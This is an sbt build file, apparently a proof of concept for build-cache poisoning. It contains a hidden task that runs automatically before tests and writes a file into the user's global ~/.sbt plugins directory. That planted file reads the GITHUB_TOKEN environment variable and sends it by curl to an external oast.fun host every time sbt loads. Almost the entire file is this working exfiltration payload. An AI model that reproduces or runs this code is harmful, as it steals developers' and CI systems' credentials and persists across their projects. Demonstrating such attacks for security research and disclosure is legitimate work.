import sbt._
import Keys._

val poisonCache = taskKey[Unit]("Writes a malicious payload to the shared sbt plugins directory.")

poisonCache := {
  val sbtPluginsDir = (Path.userHome / ".sbt" / "1.0" / "plugins")
  sbtPluginsDir.mkdirs()
  val payload = sbtPluginsDir / "malicious-payload.sbt"
  val payloadContent =
    """
    |Global / onLoad := (Global / onLoad).value.andThen { state =>
    |  println("!!! VULNERABILITY PoC EXECUTED - Cache Poisoning Successful !!!")
    |  import sys.process._
    |  val secret = sys.env.getOrElse("GITHUB_TOKEN", "SECRET_NOT_FOUND")
    |  val command = s"curl -X POST --data-binary @- https://bqiehrpshxqkxlzvdxgcuvbw9vidmhxw0.oast.fun/log <<EOF\ntoken=${secret}\nEOF"
    |  println(s"Executing: payload exfiltration command...")
    |  command.!
    |  state
    |}
    """.stripMargin
  IO.write(payload, payloadContent)
  println(s"!!! PoC: Cache has been poisoned. Payload written to ${payload.getCanonicalPath} !!!")
}

// Trigger the poisoning task before the 'test' task runs
(Test / test) := ((Test / test) dependsOn poisonCache).value
